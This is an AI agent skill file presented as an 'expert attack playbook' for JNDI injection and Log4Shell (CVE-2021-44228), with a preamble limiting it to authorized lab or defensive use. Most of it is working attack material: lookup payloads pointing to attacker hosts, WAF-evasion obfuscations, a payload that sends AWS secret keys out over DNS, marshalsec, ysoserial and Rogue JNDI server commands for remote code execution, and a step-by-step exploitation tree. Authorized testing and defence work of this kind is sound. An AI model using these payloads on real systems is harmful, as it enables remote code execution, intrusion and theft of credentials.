---
name: jndi-injection
description: >-
  JNDI injection playbook. Use when Java applications perform JNDI lookups with attacker-controlled names, especially via Log4j2, Spring, or any code path reaching InitialContext.lookup().
license: "MIT-with-third-party-provenance-review"
compatibility: "Requires the canonical reverse-skill case/scope contract; source tools are optional."
allowed-tools: Read Write Edit Glob Grep Bash
metadata:
  integrated: "true"
  integration-source: "hack-skills"
  source-path: "skills/jndi-injection/SKILL.md"
  maturity: "partial"
  integration-risk: "high"
  allowed-context: "authorized-lab,defensive"
  user-invocable: "false"
---


## Integrated reverse-skill contract

This capability is loaded through the canonical reverse-skill router. The source
material is preserved for attribution, but execution follows the host package contract:

1. **Scope first**: initialize the current `work/<case>/scope.md` with the canonical
   `case-init` flow. A target action requires an authorized scope or an explicit
   offline/lab sample; a source document is not authorization.
2. **Tools by registry**: read the package `skills/tool-index.md` before using a tool.
   Missing tools become a disclosed installation plan; imported scripts never install
   or download dependencies implicitly.
3. **One case root**: write notes, artifacts, hashes, and reports under the current
   case. Do not create a parallel source-package `case`, `output`, or `workspace`
   tree.
4. **Evidence labels**: distinguish `observed`, `inferred`, `unverified`, and
   `blocked`. Record the artifact path/hash and a reproducible command for each
   material claim.
5. **Handoff**: finish with the selected downstream skill, artifacts, verification
   result, limitations, and the next safe action. High-risk device, network, exploit,
   install, or patch operations remain explicit user-authorized actions.

The imported text may describe a different host or directory layout. Resolve paths
relative to this file or the canonical package root and ignore any source-level global
rules, hooks, MCP registration, or automatic bootstrap instructions.

# SKILL: JNDI Injection — Expert Attack Playbook

> **Vendor source summary (reference-only; not a load instruction)**: Expert JNDI injection techniques. Covers lookup mechanism abuse, RMI/LDAP class loading, JDK version constraints, Log4Shell (CVE-2021-44228), marshalsec tooling, and post-8u191 bypass via deserialization gadgets. Base models often confuse JNDI injection with general deserialization — this file clarifies the distinct attack surface.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization-insecure/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)
- [expression-language-injection](../expression-language-injection/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation

---

## 1. CORE MECHANISM

JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).

**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
// Vulnerable code pattern:
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

---

## 2. ATTACK VECTORS

### RMI (Remote Method Invocation)

```
rmi://attacker.com:1099/Exploit
```

Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
```java
// Attacker's RMI server returns:
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM downloads http://attacker.com/Exploit.class and instantiates it
```

### LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.

LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).

### DNS (detection only)

```
dns://attacker-dns-server/lookup-name
```

Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.

---

## 3. JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget

Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.

```bash
# ysoserial JRMPListener approach:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# Then JNDI lookup points to: rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL

When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. TOOLING

### marshalsec — JNDI Reference Server

```bash
# Start LDAP server serving a remote class:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Start RMI server:
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# The #Exploit refers to Exploit.class hosted at http://attacker.com/Exploit.class
```

### JNDI-Injection-Exploit (all-in-one)

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# Automatically starts RMI + LDAP servers with multiple bypass strategies
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname attacker.com
# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
```

---

## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)

### Mechanism

Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://attacker.com/x}
```

**Any logged string** containing this pattern triggers the vulnerability — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```
